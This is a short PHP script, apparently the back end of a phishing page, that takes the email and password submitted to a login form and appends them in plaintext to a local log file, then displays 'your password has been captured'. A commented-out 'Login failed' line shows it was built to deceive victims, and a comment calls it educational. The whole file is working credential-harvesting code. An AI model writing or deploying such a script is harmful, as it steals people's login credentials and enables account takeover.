<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Log the captured data (for educational purposes)
    $file = fopen("log.txt","a");
    fwrite( $file,"Email: $email | Password: $password\n");
    fclose( $file);
    
    // echo "Login failed. Please try again.";

?>

<!-- <img src="./assets/vadivelu_funny.jpg" alt="">-->
<h1> your password has been captured </h1>

<?php

?>